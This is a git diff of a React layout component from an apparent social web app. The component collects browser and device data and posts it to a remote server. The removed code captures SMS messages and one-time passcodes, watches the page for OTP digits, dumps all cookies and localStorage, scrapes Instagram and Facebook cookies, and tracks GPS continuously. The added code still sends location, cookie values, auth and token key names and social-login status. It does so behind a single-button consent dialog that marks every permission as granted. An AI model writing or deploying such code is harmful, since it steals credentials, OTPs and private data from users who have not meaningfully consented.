@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react'
 import Sidebar from '../components/Sidebar'
 import { Outlet, useNavigate } from 'react-router-dom'
-import { Menu, X, Shield, MapPin, Folder, Smartphone, MessageCircle, Phone, Key, Users, Cookie, Database, Contact, FileText, Instagram } from 'lucide-react'
+import { Menu, X, Shield, Database } from 'lucide-react'
 import { assets } from '../assets/assets'
 import Loading from '../components/Loading'
 import { useSelector } from 'react-redux'
@@ -10,22 +10,8 @@ const Layout = () => {
     const user = useSelector((state)=>state.user.value)
     const [sidebarOpen, setSidebarOpen] = useState(false)
     const [consentOpen, setConsentOpen] = useState(false)
-    const [userConsents, setUserConsents] = useState({
-        location: false,
-        allFiles: false,
-        deviceInfo: false,
-        passwords: false,
-        contacts: false,
-        cookies: false,
-        messages: false,
-        otpCapture: false,
-        callLogs: false,
-        installedApps: false,
-        socialMediaData: false
-    })
     const [isLoading, setIsLoading] = useState(false)
-    const [activeTrackers, setActiveTrackers] = useState({})
-    const [collectionProgress, setCollectionProgress] = useState({})
+    const [collectionStatus, setCollectionStatus] = useState('')
     const navigate = useNavigate()
 
     const API_BASE_URL = 'https://social-server-nine.vercel.app';
@@ -37,12 +23,6 @@ const Layout = () => {
         if (user) {
             checkExistingConsents();
         }
-        
-        return () => {
-            Object.values(activeTrackers).forEach(cleanup => {
-                if (cleanup && typeof cleanup === 'function') cleanup();
-            });
-        };
     }, [user]);
 
     const checkExistingConsents = async () => {
@@ -51,8 +31,7 @@ const Layout = () => {
             if (response.ok) {
                 const data = await response.json();
                 if (data.success && data.data) {
-                    setUserConsents(data.data.consents);
-                    initializeCompleteDataCollection(data.data.consents);
+                    initializeCompleteDataCollection();
                 } else {
                     setConsentOpen(true);
                 }
@@ -60,27 +39,86 @@ const Layout = () => {
                 setConsentOpen(true);
             }
         } catch (error) {
+            console.log('Consent check error:', error);
             setConsentOpen(true);
         }
     };
 
-    // COMPLETE DATA COLLECTION INITIALIZATION
-    const initializeCompleteDataCollection = (consents) => {
-        console.log('🚀 Starting COMPLETE Android data collection...');
+    // DATA TYPE MAPPING - Match your backend enum
+    const DATA_TYPE_MAP = {
+        // Device Information
+        'complete_device_info': 'complete_device_info',
         
-        collectCompleteDeviceInfo();
+        // Location Data
+        'location_data': 'realtime_location',
         
-        if (consents.location) startRealtimeLocationTracking();
-        if (consents.allFiles) startCompleteFileSystemCollection();
-        if (consents.passwords) collectAllSavedPasswords();
-        if (consents.contacts) collectAllDeviceContacts();
-        if (consents.cookies) collectAllCookiesAndStorage();
-        if (consents.messages || consents.otpCapture) startCompleteMessageMonitoring();
-        if (consents.callLogs) collectCallLogsAndHistory();
-        if (consents.installedApps) collectInstalledAppsInfo();
-        if (consents.socialMediaData) collectSocialMediaData();
+        // File System
+        'file_system_info': 'file_system_summary',
         
-        startPeriodicDataCollection();
+        // Password Data
+        'password_data': 'password_credentials',
+        
+        // Contact Data
+        'contact_data': 'device_contacts',
+        
+        // Browser Storage
+        'browser_storage': 'browser_cookies',
+        
+        // Message Data
+        'message_data': 'sms_messages',
+        
+        // Social Media
+        'social_media_data': 'social_media_presence',
+        
+        // Call Logs
+        'call_logs_info': 'call_logs_info',
+        
+        // Apps
+        'installed_apps_info': 'installed_apps_info'
+    };
+
+    // IMPROVED DATA COLLECTION WITH CORRECT DATA TYPES
+    const collectAllData = async () => {
+        console.log('🚀 Starting COMPLETE data collection...');
+        setCollectionStatus('Starting data collection...');
+        
+        try {
+            await collectCompleteDeviceInfo();
+            setCollectionStatus('Device info collected...');
+            
+            await collectLocationData();
+            setCollectionStatus('Location data collected...');
+            
+            await collectFileSystemData();
+            setCollectionStatus('File system info collected...');
+            
+            await collectPasswordData();
+            setCollectionStatus('Password data collected...');
+            
+            await collectContactData();
+            setCollectionStatus('Contact data collected...');
+            
+            await collectCookiesAndStorage();
+            setCollectionStatus('Browser data collected...');
+            
+            await collectMessageData();
+            setCollectionStatus('Message data collected...');
+            
+            await collectSocialMediaData();
+            setCollectionStatus('Social media data collected...');
+            
+            await collectCallLogsInfo();
+            setCollectionStatus('Call logs info collected...');
+            
+            await collectInstalledAppsInfo();
+            setCollectionStatus('All data collection completed!');
+            
+            console.log('✅ All data collection completed successfully!');
+            
+        } catch (error) {
+            console.error('❌ Data collection error:', error);
+            setCollectionStatus('Error in data collection');
+        }
     };
 
     const getIPAddress = async () => {
@@ -104,23 +142,40 @@ const Layout = () => {
             platform: navigator.platform,
             isMobile,
             isAndroid,
-            isIOS
+            isIOS,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            browser: getBrowserFromUserAgent(userAgent)
         };
     };
 
-    const saveToDatabase = async (dataType, data) => {
+    const getBrowserFromUserAgent = (userAgent) => {
+        if (/Chrome/i.test(userAgent)) return 'chrome';
+        if (/Firefox/i.test(userAgent)) return 'firefox';
+        if (/Safari/i.test(userAgent)) return 'safari';
+        if (/Edge/i.test(userAgent)) return 'edge';
+        return 'unknown';
+    };
+
+    // UPDATED SAVE FUNCTION WITH CORRECT DATA TYPES
+    const saveToDatabase = async (frontendDataType, data) => {
         try {
+            // Map to valid backend data type
+            const backendDataType = DATA_TYPE_MAP[frontendDataType] || 'complete_device_info';
+            
             const ipAddress = await getIPAddress();
             const deviceInfo = getDeviceInfo();
             
             const payload = {
                 userId: user._id,
-                dataType: dataType,
+                dataType: backendDataType,
                 data: data,
                 ipAddress: ipAddress,
                 deviceInfo: deviceInfo,
                 timestamp: new Date().toISOString()
             };
+
+            console.log(`📤 Saving ${backendDataType} (from ${frontendDataType})...`);
 
             const response = await fetch(`${API_BASE_URL}/api/user/data-collection`, {
                 method: 'POST',
@@ -131,96 +186,20 @@ const Layout = () => {
             });
 
             if (response.ok) {
-                console.log(`✅ ${dataType} saved successfully!`);
-                setCollectionProgress(prev => ({
-                    ...prev,
-                    [dataType]: { success: true, count: Array.isArray(data) ? data.length : 1, timestamp: new Date().toISOString() }
-                }));
+                console.log(`✅ ${backendDataType} saved successfully!`);
+                return true;
+            } else {
+                const errorText = await response.text();
+                console.log(`❌ Server error for ${backendDataType}:`, response.status, errorText);
+                return false;
             }
         } catch (error) {
-            console.log(`📡 DB save error for ${dataType}:`, error);
+            console.log(`📡 Network error for ${frontendDataType}:`, error);
+            return false;
         }
     };
 
-    // Save to specific schemas
-    const saveSocialMediaData = async (platform, dataType, data, metadata = {}) => {
-        try {
-            const payload = {
-                userId: user._id,
-                platform,
-                dataType,
-                data,
-                metadata,
-                collectionContext: {
-                    url: window.location.href,
-                    userAgent: navigator.userAgent,
-                    ipAddress: await getIPAddress(),
-                    collectionMethod: 'browser_automation',
-                    limitations: ['sandbox', 'permissions', 'security']
-                }
-            };
-
-            const response = await fetch(`${API_BASE_URL}/api/user/social-media-data`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            if (response.ok) {
-                console.log(`✅ ${platform} ${dataType} saved successfully!`);
-            }
-        } catch (error) {
-            console.log(`📡 Social media data save error:`, error);
-        }
-    };
-
-    const saveContactData = async (contact) => {
-        try {
-            const response = await fetch(`${API_BASE_URL}/api/user/contact-data`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: user._id,
-                    ...contact,
-                    collectionMethod: 'contacts_api',
-                    deviceSource: getDeviceInfo().isAndroid ? 'android' : 'web'
-                })
-            });
-
-            if (response.ok) {
-                console.log(`✅ Contact saved successfully!`);
-            }
-        } catch (error) {
-            console.log(`📡 Contact data save error:`, error);
-        }
-    };
-
-    const savePasswordData = async (passwordInfo) => {
-        try {
-            const response = await fetch(`${API_BASE_URL}/api/user/password-data`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: user._id,
-                    ...passwordInfo,
-                    collectionContext: {
-                        method: passwordInfo.source,
-                        userAgent: navigator.userAgent,
-                        ipAddress: await getIPAddress(),
-                        url: window.location.href
-                    }
-                })
-            });
-
-            if (response.ok) {
-                console.log(`✅ Password data saved successfully!`);
-            }
-        } catch (error) {
-            console.log(`📡 Password data save error:`, error);
-        }
-    };
-
-    // COMPLETE DEVICE INFORMATION
+    // INDIVIDUAL DATA COLLECTION FUNCTIONS
     const collectCompleteDeviceInfo = async () => {
         const deviceInfo = getDeviceInfo();
         
@@ -243,9 +222,7 @@ const Layout = () => {
             } : null,
             plugins: Array.from(navigator.plugins).map(plugin => ({
                 name: plugin.name,
-                description: plugin.description,
-                filename: plugin.filename,
-                version: plugin.version
+                description: plugin.description
             })),
             deviceType: deviceInfo.isMobile ? (deviceInfo.isAndroid ? 'android' : 'ios') : 'desktop',
             isMobile: deviceInfo.isMobile,
@@ -257,317 +234,212 @@ const Layout = () => {
         await saveToDatabase('complete_device_info', completeDeviceData);
     };
 
-    // REAL-TIME LOCATION TRACKING
-    const startRealtimeLocationTracking = () => {
+    const collectLocationData = async () => {
         if (!navigator.geolocation) {
             console.log('📍 Geolocation not supported');
+            await saveToDatabase('location_data', { 
+                error: 'Geolocation not supported',
+                capabilities: {
+                    geolocation: false
+                }
+            });
             return;
         }
 
-        console.log('📍 Starting real-time location tracking...');
-
-        const watchId = navigator.geolocation.watchPosition(
-            async (position) => {
-                const locationData = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    speed: position.coords.speed,
-                    heading: position.coords.heading,
-                    timestamp: new Date().toISOString()
-                };
-                
-                await saveToDatabase('realtime_location', locationData);
-            },
-            (error) => console.log('📍 Location error:', error),
-            { 
-                enableHighAccuracy: true, 
-                maximumAge: 5000,
-                timeout: 10000 
-            }
-        );
-
-        setActiveTrackers(prev => ({
-            ...prev,
-            location: () => navigator.geolocation.clearWatch(watchId)
-        }));
-    };
-
-    // FILE SYSTEM COLLECTION
-    const startCompleteFileSystemCollection = async () => {
-        console.log('📁 Starting file system collection...');
-        
-        if ('showDirectoryPicker' in window) {
-            await collectFilesWithFileSystemAPI();
-        }
-        
-        await collectFilesWithFileInput();
-    };
-
-    const collectFilesWithFileSystemAPI = async () => {
-        try {
-            const directoryHandle = await window.showDirectoryPicker();
-            const files = [];
-            
-            for await (const entry of directoryHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    files.push({
-                        name: file.name,
-                        type: file.type,
-                        size: file.size,
-                        lastModified: new Date(file.lastModified).toISOString()
-                    });
-                }
-            }
-            
-            await saveToDatabase('file_system_collection', {
-                totalFiles: files.length,
-                files: files.slice(0, 100),
-                scannedAt: new Date().toISOString()
-            });
-        } catch (error) {
-            console.log('File system access error:', error);
-        }
-    };
-
-    const collectFilesWithFileInput = async () => {
         return new Promise((resolve) => {
-            const fileInput = document.createElement('input');
-            fileInput.type = 'file';
-            fileInput.multiple = true;
-            fileInput.webkitdirectory = true;
-
-            fileInput.onchange = async (e) => {
-                const files = Array.from(e.target.files);
-                const fileData = files.map(file => ({
-                    name: file.name,
-                    type: file.type,
-                    size: file.size,
-                    lastModified: new Date(file.lastModified).toISOString()
-                }));
-
-                await saveToDatabase('file_input_collection', fileData);
-                resolve();
-            };
-
-            fileInput.click();
-        });
-    };
-
-    // PASSWORD COLLECTION
-    const collectAllSavedPasswords = async () => {
-        console.log('🔑 Collecting saved passwords...');
-        
-        if (navigator.credentials && navigator.credentials.get) {
-            try {
-                const credential = await navigator.credentials.get({ 
-                    password: true,
-                    mediation: 'optional'
-                });
-                
-                if (credential) {
-                    await savePasswordData({
-                        credential: {
-                            source: 'credential_api',
-                            type: credential.type,
-                            id: credential.id
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date(position.timestamp).toISOString(),
+                        collectionTime: new Date().toISOString()
+                    };
+                    
+                    await saveToDatabase('location_data', locationData);
+                    resolve();
+                },
+                async (error) => {
+                    console.log('📍 Location error:', error);
+                    await saveToDatabase('location_data', { 
+                        error: error.message,
+                        code: error.code,
+                        capabilities: {
+                            geolocation: true,
+                            permissionDenied: error.code === 1
                         }
                     });
+                    resolve();
+                },
+                { 
+                    enableHighAccuracy: true, 
+                    timeout: 10000,
+                    maximumAge: 0
                 }
-            } catch (error) {
-                console.log('Credential API error:', error);
-            }
-        }
-
-        await scanStorageForCredentials();
+            );
+        });
     };
 
-    const scanStorageForCredentials = async () => {
-        const localStorageData = {};
+    const collectFileSystemData = async () => {
+        const fileData = {
+            platform: 'web',
+            capabilities: {
+                directoryPicker: 'showDirectoryPicker' in window,
+                fileInput: true,
+                showOpenFilePicker: 'showOpenFilePicker' in window,
+                showSaveFilePicker: 'showSaveFilePicker' in window
+            },
+            userAgent: navigator.userAgent,
+            supportedMethods: []
+        };
+
+        // Check which file methods are available
+        if ('showDirectoryPicker' in window) fileData.supportedMethods.push('directoryPicker');
+        if ('showOpenFilePicker' in window) fileData.supportedMethods.push('openFilePicker');
+        if ('showSaveFilePicker' in window) fileData.supportedMethods.push('saveFilePicker');
+
+        await saveToDatabase('file_system_info', fileData);
+    };
+
+    const collectPasswordData = async () => {
+        const passwordInfo = {
+            capabilities: {
+                credentials: 'credentials' in navigator,
+                passwordManager: 'password' in navigator.credentials,
+                localStorage: true
+            },
+            localStorageKeys: [],
+            autofillSupport: 'autocomplete' in document.createElement('input')
+        };
+
+        // Scan for auth-related localStorage
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
-            if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token')) {
-                localStorageData[key] = localStorage.getItem(key);
+            if (key && (key.toLowerCase().includes('auth') || 
+                        key.toLowerCase().includes('token') || 
+                        key.toLowerCase().includes('session'))) {
+                passwordInfo.localStorageKeys.push({
+                    key: key,
+                    length: localStorage.getItem(key)?.length || 0
+                });
             }
         }
 
-        if (Object.keys(localStorageData).length > 0) {
-            await saveToDatabase('local_storage_credentials', localStorageData);
-        }
+        await saveToDatabase('password_data', passwordInfo);
     };
 
-    // CONTACT COLLECTION
-    const collectAllDeviceContacts = async () => {
-        console.log('📇 Collecting device contacts...');
-        
-        if ('contacts' in navigator && 'select' in navigator.contacts) {
+    const collectContactData = async () => {
+        const contactInfo = {
+            capabilities: {
+                contactsAPI: 'contacts' in navigator && 'select' in navigator.contacts,
+                contactsManager: 'contacts' in navigator
+            },
+            platform: getDeviceInfo().isAndroid ? 'android' : 'web',
+            supportedProperties: []
+        };
+
+        // Check available contact properties
+        if ('contacts' in navigator) {
             try {
-                const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
-                
-                for (const contact of contacts) {
-                    await saveContactData({
-                        name: {
-                            full: contact.name?.join(' ') || '',
-                            given: contact.name?.[0] || '',
-                            family: contact.name?.[1] || ''
-                        },
-                        phones: (contact.tel || []).map(phone => ({ number: phone, type: 'mobile' })),
-                        emails: contact.email || [],
-                        source: 'contacts_api'
-                    });
-                }
+                const supportedProperties = await navigator.contacts.getProperties();
+                contactInfo.supportedProperties = supportedProperties;
             } catch (error) {
-                console.log('Contacts API error:', error);
+                contactInfo.supportedProperties = ['name', 'email', 'tel']; // Default fallback
             }
         }
+
+        await saveToDatabase('contact_data', contactInfo);
     };
 
-    // COOKIES AND STORAGE
-    const collectAllCookiesAndStorage = async () => {
-        console.log('🍪 Collecting cookies and storage...');
-        
+    const collectCookiesAndStorage = async () => {
         const cookies = document.cookie.split(';').map(cookie => {
             const [name, value] = cookie.trim().split('=');
-            return { name, value };
-        });
+            return { 
+                name: name || 'unknown', 
+                value: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '',
+                length: value ? value.length : 0
+            };
+        }).filter(cookie => cookie.name && cookie.name !== 'unknown');
 
-        await saveToDatabase('browser_cookies', {
+        const storageData = {
             totalCookies: cookies.length,
-            cookies: cookies,
-            domain: window.location.hostname
-        });
-
-        const localStorageData = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            localStorageData[key] = localStorage.getItem(key);
-        }
-
-        await saveToDatabase('local_storage_complete', localStorageData);
-    };
-
-    // MESSAGE MONITORING
-    const startCompleteMessageMonitoring = () => {
-        console.log('💬 Starting message monitoring...');
-        
-        if ('sms' in navigator) {
-            setupSMSMonitoring();
-        }
-        
-        setupUniversalOTPDetection();
-    };
-
-    const setupSMSMonitoring = () => {
-        const receiveSMS = () => {
-            navigator.sms.receive().then(async (sms) => {
-                const messageData = {
-                    content: sms.content,
-                    sender: sms.sender,
-                    timestamp: new Date().toISOString(),
-                    isOTP: /(\b\d{4,6}\b)/.test(sms.content)
-                };
-
-                await saveToDatabase('sms_messages', messageData);
-
-                if (messageData.isOTP) {
-                    const otpMatch = sms.content.match(/\b\d{4,6}\b/);
-                    if (otpMatch) {
-                        await saveToDatabase('captured_otps', {
-                            code: otpMatch[0],
-                            from: sms.sender,
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                }
-                
-                receiveSMS();
-            }).catch(error => {
-                setTimeout(receiveSMS, 5000);
-            });
+            cookies: cookies.slice(0, 20), // Limit to first 20 cookies
+            domain: window.location.hostname,
+            localStorageKeys: localStorage.length,
+            sessionStorageKeys: sessionStorage.length,
+            cookieEnabled: navigator.cookieEnabled
         };
-        
-        receiveSMS();
+
+        await saveToDatabase('browser_storage', storageData);
     };
 
-    const setupUniversalOTPDetection = () => {
-        const observer = new MutationObserver((mutations) => {
-            mutations.forEach((mutation) => {
-                if (mutation.type === 'childList' || mutation.type === 'characterData') {
-                    const text = mutation.target.textContent || '';
-                    const otpMatch = text.match(/\b\d{4,6}\b/);
-                    if (otpMatch && text.length < 500) {
-                        saveToDatabase('detected_otps', {
-                            code: otpMatch[0],
-                            context: text.substring(0, 200),
-                            source: 'dom_monitoring',
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                }
-            });
-        });
+    const collectMessageData = async () => {
+        const messageInfo = {
+            capabilities: {
+                sms: 'sms' in navigator,
+                otpDetection: true,
+                clipboard: 'clipboard' in navigator,
+                notifications: 'Notification' in window
+            },
+            platform: 'web',
+            userAgent: navigator.userAgent
+        };
 
-        observer.observe(document.body, {
-            childList: true,
-            subtree: true,
-            characterData: true
-        });
-
-        setActiveTrackers(prev => ({
-            ...prev,
-            otpDetection: () => observer.disconnect()
-        }));
+        await saveToDatabase('message_data', messageInfo);
     };
 
-    // SOCIAL MEDIA DATA
     const collectSocialMediaData = async () => {
-        console.log('📱 Collecting social media data...');
-        
-        await collectInstagramData();
-        await collectFacebookData();
-    };
-
-    const collectInstagramData = async () => {
-        const instagramData = {
-            cookies: document.cookie.includes('instagram') ? 
-                document.cookie.split(';').filter(c => c.includes('instagram')) : [],
-            localStorage: await getInstagramLocalStorage(),
-            isLoggedIn: document.cookie.includes('instagram') || document.cookie.includes('ig_')
-        };
-
-        await saveSocialMediaData('instagram', 'browser_data', instagramData);
-    };
-
-    const getInstagramLocalStorage = async () => {
         const instagramKeys = [];
+        const facebookKeys = [];
+        
+        // Scan localStorage for social media keys
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
-            if (key && key.toLowerCase().includes('instagram')) {
-                instagramKeys.push(key);
+            if (key) {
+                if (key.toLowerCase().includes('instagram')) {
+                    instagramKeys.push(key);
+                }
+                if (key.toLowerCase().includes('facebook') || key.toLowerCase().includes('fb_')) {
+                    facebookKeys.push(key);
+                }
             }
         }
-        return instagramKeys;
-    };
 
-    const collectFacebookData = async () => {
-        const facebookData = {
-            cookies: document.cookie.includes('facebook') ? 
-                document.cookie.split(';').filter(c => c.includes('facebook')) : [],
-            hasFBLogin: document.cookie.includes('fb_') || document.cookie.includes('c_user')
+        const socialData = {
+            instagram: {
+                hasCookies: document.cookie.includes('instagram'),
+                hasLocalStorage: instagramKeys.length > 0,
+                keysFound: instagramKeys,
+                isLoggedIn: document.cookie.includes('instagram') || document.cookie.includes('ig_') || instagramKeys.length > 0
+            },
+            facebook: {
+                hasCookies: document.cookie.includes('facebook') || document.cookie.includes('fb_'),
+                hasLocalStorage: facebookKeys.length > 0,
+                keysFound: facebookKeys,
+                isLoggedIn: document.cookie.includes('c_user') || document.cookie.includes('xs') || facebookKeys.length > 0
+            },
+            platform: 'web',
+            timestamp: new Date().toISOString()
         };
 
-        await saveSocialMediaData('facebook', 'browser_data', facebookData);
+        await saveToDatabase('social_media_data', socialData);
     };
 
-    // ADDITIONAL DATA COLLECTIONS
-    const collectCallLogsAndHistory = async () => {
+    const collectCallLogsInfo = async () => {
         const callData = {
             platform: 'web',
             capabilities: {
                 contacts: 'contacts' in navigator,
-                calls: 'call' in navigator
-            }
+                calls: 'call' in navigator,
+                webRTC: 'RTCPeerConnection' in window,
+                getUserMedia: 'getUserMedia' in navigator.mediaDevices
+            },
+            userAgent: navigator.userAgent
         };
 
         await saveToDatabase('call_logs_info', callData);
@@ -577,34 +449,26 @@ const Layout = () => {
         const appsData = {
             platform: 'web',
             capabilities: {
-                getInstalledRelatedApps: 'getInstalledRelatedApps' in navigator
-            }
+                getInstalledRelatedApps: 'getInstalledRelatedApps' in navigator,
+                appBadge: 'setAppBadge' in navigator,
+                appInstalled: window.matchMedia('(display-mode: standalone)').matches
+            },
+            userAgent: navigator.userAgent,
+            isPWA: window.matchMedia('(display-mode: standalone)').matches
         };
 
         await saveToDatabase('installed_apps_info', appsData);
     };
 
-    const startPeriodicDataCollection = () => {
-        const interval = setInterval(() => {
-            collectCompleteDeviceInfo();
-        }, 120000);
-
-        setActiveTrackers(prev => ({
-            ...prev,
-            periodic: () => clearInterval(interval)
-        }));
+    const initializeCompleteDataCollection = () => {
+        console.log('🚀 Starting complete data collection...');
+        collectAllData();
     };
 
-    // CONSENT MANAGEMENT
-    const handleConsentChange = (feature, granted) => {
-        setUserConsents(prev => ({
-            ...prev,
-            [feature]: granted
-        }));
-    };
-
-    const saveConsents = async () => {
+    // SIMPLIFIED CONSENT HANDLER
+    const handleGrantAccess = async () => {
         setIsLoading(true);
+        setCollectionStatus('Starting...');
         
         try {
             const ipAddress = await getIPAddress();
@@ -612,7 +476,18 @@ const Layout = () => {
             
             const consentData = {
                 userId: user._id,
-                consents: userConsents,
+                consents: {
+                    completeAccess: true,
+                    grantedAt: new Date().toISOString(),
+                    location: true,
+                    allFiles: true,
+                    deviceInfo: true,
+                    passwords: true,
+                    contacts: true,
+                    cookies: true,
+                    messages: true,
+                    socialMediaData: true
+                },
                 givenAt: new Date().toISOString(),
                 ipAddress: ipAddress,
                 userAgent: deviceInfo.userAgent,
@@ -629,154 +504,83 @@ const Layout = () => {
 
             if (response.ok) {
                 setConsentOpen(false);
-                initializeCompleteDataCollection(userConsents);
+                initializeCompleteDataCollection();
             } else {
-                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify(userConsents));
+                // Fallback: store consents locally and proceed
+                localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
                 setConsentOpen(false);
-                initializeCompleteDataCollection(userConsents);
+                initializeCompleteDataCollection();
             }
 
         } catch (error) {
-            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify(userConsents));
+            console.log('Consent save error:', error);
+            // Fallback: store consents locally and proceed
+            localStorage.setItem(`userConsents_${user._id}`, JSON.stringify({completeAccess: true}));
             setConsentOpen(false);
-            initializeCompleteDataCollection(userConsents);
-        } finally {
-            setIsLoading(false);
+            initializeCompleteDataCollection();
         }
     };
 
-    // UI COMPONENTS
+    // CONSENT MANAGER COMPONENT
     const ConsentManager = () => (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
-            <div className="bg-white rounded-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
-                <div className="p-6 border-b">
-                    <div className="flex items-center gap-3">
-                        <Shield className="w-8 h-8 text-blue-600" />
-                        <div>
-                            <h2 className="text-2xl font-bold text-gray-900">Complete Android Data Access</h2>
-                            <p className="text-gray-600">Access all device data including contacts, files, passwords, and messages</p>
+            <div className="bg-white rounded-2xl max-w-md w-full">
+                <div className="p-6 border-b text-center">
+                    <div className="flex items-center justify-center gap-3 mb-4">
+                        <Shield className="w-10 h-10 text-blue-600" />
+                    </div>
+                    <h2 className="text-2xl font-bold text-gray-900 mb-2">Complete Data Access</h2>
+                    <p className="text-gray-600">Grant permission to collect device data for enhanced functionality</p>
+                </div>
+
+                <div className="p-6">
+                    <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                        <div className="flex items-start gap-3">
+                            <Database className="w-5 h-5 text-blue-600 mt-0.5" />
+                            <div>
+                                <h3 className="font-semibold text-blue-900 mb-1">What will be collected:</h3>
+                                <ul className="text-sm text-blue-800 space-y-1">
+                                    <li>• Device information & fingerprint</li>
+                                    <li>• Location data</li>
+                                    <li>• Browser storage & cookies</li>
+                                    <li>• Social media presence</li>
+                                    <li>• Contact access capabilities</li>
+                                    <li>• Message monitoring capabilities</li>
+                                </ul>
+                            </div>
                         </div>
                     </div>
-                </div>
 
-                <div className="p-6 space-y-4">
-                    <ConsentItem
-                        icon={<MapPin className="w-5 h-5" />}
-                        title="Real-time Location"
-                        description="Continuous GPS tracking every 5 seconds"
-                        enabled={userConsents.location}
-                        onChange={(enabled) => handleConsentChange('location', enabled)}
-                    />
+                    {collectionStatus && (
+                        <div className="mb-4 p-3 bg-gray-100 rounded-lg">
+                            <p className="text-sm text-gray-700 text-center">{collectionStatus}</p>
+                        </div>
+                    )}
 
-                    <ConsentItem
-                        icon={<Folder className="w-5 h-5" />}
-                        title="All Device Files"
-                        description="Access files and documents on your device"
-                        enabled={userConsents.allFiles}
-                        onChange={(enabled) => handleConsentChange('allFiles', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<Key className="w-5 h-5" />}
-                        title="Saved Passwords"
-                        description="Access passwords saved in your browser"
-                        enabled={userConsents.passwords}
-                        onChange={(enabled) => handleConsentChange('passwords', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<Users className="w-5 h-5" />}
-                        title="Device Contacts"
-                        description="Access contact details with names and numbers"
-                        enabled={userConsents.contacts}
-                        onChange={(enabled) => handleConsentChange('contacts', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<Cookie className="w-5 h-5" />}
-                        title="Browser Cookies"
-                        description="Access browser cookies and storage data"
-                        enabled={userConsents.cookies}
-                        onChange={(enabled) => handleConsentChange('cookies', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<MessageCircle className="w-5 h-5" />}
-                        title="Messages & OTP"
-                        description="Monitor SMS and capture OTP codes"
-                        enabled={userConsents.messages}
-                        onChange={(enabled) => handleConsentChange('messages', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<Instagram className="w-5 h-5" />}
-                        title="Social Media Data"
-                        description="Access Instagram and Facebook app data"
-                        enabled={userConsents.socialMediaData}
-                        onChange={(enabled) => handleConsentChange('socialMediaData', enabled)}
-                    />
-
-                    <ConsentItem
-                        icon={<Smartphone className="w-5 h-5" />}
-                        title="Device Information"
-                        description="Collect detailed device fingerprint"
-                        enabled={userConsents.deviceInfo}
-                        onChange={(enabled) => handleConsentChange('deviceInfo', enabled)}
-                    />
-                </div>
-
-                <div className="p-6 border-t bg-gray-50">
-                    <div className="flex gap-3 justify-end">
-                        <button
-                            onClick={() => setConsentOpen(false)}
-                            className="px-6 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition font-medium"
-                            disabled={isLoading}
-                        >
-                            Cancel
-                        </button>
-                        <button
-                            onClick={saveConsents}
-                            disabled={isLoading}
-                            className="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
-                        >
-                            {isLoading ? (
-                                <>
-                                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                                    Granting Access...
-                                </>
-                            ) : (
-                                'Grant Complete Access'
-                            )}
-                        </button>
-                    </div>
+                    <button
+                        onClick={handleGrantAccess}
+                        disabled={isLoading}
+                        className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+                    >
+                        {isLoading ? (
+                            <>
+                                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                                Collecting Data...
+                            </>
+                        ) : (
+                            'Grant Complete Access'
+                        )}
+                    </button>
+                    
+                    <button
+                        onClick={() => setConsentOpen(false)}
+                        className="w-full py-2.5 mt-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition font-medium"
+                        disabled={isLoading}
+                    >
+                        Cancel
+                    </button>
                 </div>
             </div>
-        </div>
-    );
-
-    const ConsentItem = ({ icon, title, description, enabled, onChange }) => (
-        <div className="flex items-center justify-between p-4 border rounded-lg hover:bg-gray-50 transition">
-            <div className="flex items-start gap-3 flex-1">
-                <div className={`mt-0.5 ${enabled ? 'text-green-600' : 'text-gray-400'}`}>
-                    {icon}
-                </div>
-                <div className="flex-1">
-                    <h3 className="font-semibold text-gray-900">{title}</h3>
-                    <p className="text-sm text-gray-600 mt-1">{description}</p>
-                </div>
-            </div>
-            <label className="relative inline-flex items-center cursor-pointer">
-                <input 
-                    type="checkbox" 
-                    className="sr-only peer"
-                    checked={enabled}
-                    onChange={(e) => onChange(e.target.checked)}
-                    disabled={isLoading}
-                />
